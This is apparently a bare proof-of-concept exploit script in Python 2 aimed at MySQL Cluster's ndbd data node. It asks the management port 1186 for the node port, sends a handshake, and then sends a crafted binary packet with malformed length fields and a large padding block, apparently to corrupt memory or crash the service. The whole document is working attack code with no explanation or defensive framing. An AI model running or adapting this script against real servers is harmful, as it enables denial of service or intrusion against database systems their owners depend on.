#!/usr/bin/env python2

from socket import *
import binascii
import os
import sys
import random
import time
import struct

host = sys.argv[1]

PKT="""
 24 48 04 50 7a 01 00 04 a2 0f f6 00 00 00 00 00
 02 00 00 00 f1 ff ff ff 02 ff ff ff 02 00 00 00
 03 00 00 00 41 42 43 04 51 52 53 54 00 00 00 00
 00 80 00 00 00 00 00 00 00 00 01 00 00 40 00 00
 6d 79 73 71 6c 00 00 00 00 00 00 00 00 00 00 00
 03 00 00 00 02 00 00 00 c8 74 00 00 ea 0c 00 00
 2f 04 00 00 
 """
 
PKT += """4e 44 42 53 59 53 46 32"""
 
PKT+="""
 e2 ff ff ff 
 10 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 41 42 43 44 51 52 53 54 
 """
 
PKT2="""01 02 03 04 11 22 33 44
 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 00 00 00 00 00 00 00 00 00 00 00 00 00 26 33 00
 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 00 00 00 00 24 0f 00 14 18 00 ff 04 02 80 fa 00
 00 00 00 00 d5 02 00 00 03 00 02 80 03 00 00 00
 11 00 00 00 00 00 00 00 05 00 00 00 73 79 73 2f
 64 65 66 2f 53 59 53 54 41 42 5f 30 1d 6c 78 d5

"""

def get_ndbd_port():
    s='get connection parameter\n'
    s+='param: 406\n'
    s+='node2: 3\n'
    s+='node1: 2\n'
    s+='\n'

    sock=socket(AF_INET,SOCK_STREAM)
    sock.connect((host,1186))
    sock.sendall(s)
    s=sock.recv(1000)
    for l in s.split('\n'):
        if l.find('value: -')>=0:
            p=int(l[8:])
            return p
    print 'Failed to get ndbd port'
    sys.exit()


def tobinary(s):
    s=s.replace(' ','')
    s=s.replace('\n','')
    return binascii.unhexlify(s)

def hello(sock):
    s='6e 64 62 64 0a'
    s+='6e 64 62 64 20 70 61 73  73 77 64 0a'
    sock.sendall(tobinary(s))
    try:
        s=sock.recv(1000)
    except:
        pass

    s='33 20 31 20 32 20 30 0a'
    sock.sendall(tobinary(s))
    try:
        s=sock.recv(1000)
    except:
        pass
    s='24 07 00 0c 03 00 00 00  a2 0f fc 00 00 00 00 00'
    s+='03 00 a2 0f 18 00 08 00  18 00 08 00   '
    sock.sendall(tobinary(s))
    try:
        s=sock.recv(1000)
    except:
        pass

port = get_ndbd_port()
print 'Found ndbd port: %d' % port


i=0
while 1:
    i+=1
    print 'request %d' %i
    sock=socket(AF_INET,SOCK_STREAM)
    sock.connect((host,port))
    sock.settimeout(2)

    try:
        hello(sock)
    except:
        pass

    data=tobinary(PKT)
    data+='\x00'*(0x1000 + 136)
    try:
        sock.sendall(data)
    except:
        pass
    try:
        s=sock.recv(100000)
        print list(s)
    except:
        pass

    sock.close()
    break
